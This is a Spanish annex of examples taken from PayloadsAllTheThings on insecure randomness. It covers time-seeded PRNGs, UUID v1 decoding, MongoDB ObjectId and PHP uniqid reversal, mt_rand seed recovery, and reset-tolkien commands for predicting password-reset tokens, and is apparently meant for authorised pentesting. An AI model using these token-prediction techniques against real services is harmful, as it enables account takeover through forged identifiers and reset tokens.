# Autenticación rota: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Randomness/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Randomness/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Insecure Randomness / Metodología

### Variantes presentes en tablas o texto del apartado

```text
uniqid()
```

## 2. Insecure Randomness / Time-Based Seeds

```py
import random
import time

seed = int(time.time())
random.seed(seed)
print(random.randint(1, 100))
```

```python
import random
import time

# Seed based on the provided timestamp
seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))
random.seed(seed)

# Generate the random number
print(random.randint(1, 100))
```

### Variantes presentes en tablas o texto del apartado

```text
2024-11-10 13:37
```

## 3. Insecure Randomness / GUID / UUID

### Variantes presentes en tablas o texto del apartado

```text
550e8400-e29b-41d4-a716-446655440000
```

## 4. GUID / UUID / GUID Versions

### Variantes presentes en tablas o texto del apartado

```text
xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx
00000000-0000-0000-0000-000000000000
```

## 5. GUID / UUID / Herramientas

```ps1
    $ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
    UUID version: 1
    UUID time: 2022-04-13 08:06:13.202186
    UUID timestamp: 138691299732021860
    UUID node: 91754721024
    UUID MAC address: 00:15:5d:01:ef:00
    UUID clock sequence: 2099
    
    $ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
```

## 6. Insecure Randomness / Mongo ObjectId

### Variantes presentes en tablas o texto del apartado

```text
5ae9b90a2c144b9def01ec37
5ae9bac82c144b9def01ec39
```

## 7. Mongo ObjectId / Herramientas

```ps1
    ./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
    5ae9bac82c144b9def01ec39
    5ae9bacf2c144b9def01ec3a
    5ae9bada2c144b9def01ec3b
```

```py
    def MongoDB_ObjectID(timestamp, process, counter):
        return "%08x%10x%06x" % (
            timestamp,
            process,
            counter,
        )

    def reverse_MongoDB_ObjectID(token):
        timestamp = int(token[0:8], 16)
        process = int(token[8:18], 16)
        counter = int(token[18:24], 16)
        return timestamp, process, counter


    def check(token):
        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
        return token == MongoDB_ObjectID(timestamp, process, counter)

    tokens = ["5ae9b90a2c144b9def01ec37", "5ae9bac82c144b9def01ec39"]
    for token in tokens:
        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
        print(f"{token}: {timestamp} - {process} - {counter}")
```

## 8. Insecure Randomness / Uniqid

### Variantes presentes en tablas o texto del apartado

```text
4b26d474c77daf9a94d82039f4c9b8e555ad505249437c0987f12c1b80de0bf4
ae72a4c4cdf77f39d1b0133394c0cb24c33c61c4505a9fe33ab89315d3f5a1e4
```

## 9. Uniqid / Herramientas

```py
import math
import datetime

def uniqid(timestamp: float) -> str:
    sec = math.floor(timestamp)
    usec = round(1000000 * (timestamp - sec))
    return "%8x%05x" % (sec, usec)

def reverse_uniqid(value: str) -> float:
    sec = int(value[:8], 16)
    usec = int(value[8:], 16)
    return float(f"{sec}.{usec}")

tokens = ["6659cea087cd6" , "6659cea087cea"]
for token in tokens:
    t = float(reverse_uniqid(token))
    d = datetime.datetime.fromtimestamp(t)
    print(f"{token} - {t} => {d}")
```

## 10. Insecure Randomness / Mt_rand

```ps1
./display_mt_rand.php 12345678 123
712530069 674417379

./reverse_mt_rand.py 712530069 674417379 123 1
```

## 11. Insecure Randomness / Personalizado Algorithms

### Variantes presentes en tablas o texto del apartado

```text
$token = md5($emailId).rand(10,9999);
$token = md5(time()+123456789 % rand(4000, 55000000));
```

## 12. Personalizado Algorithms / Herramientas

```ps1
    reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7"
    reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid"
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
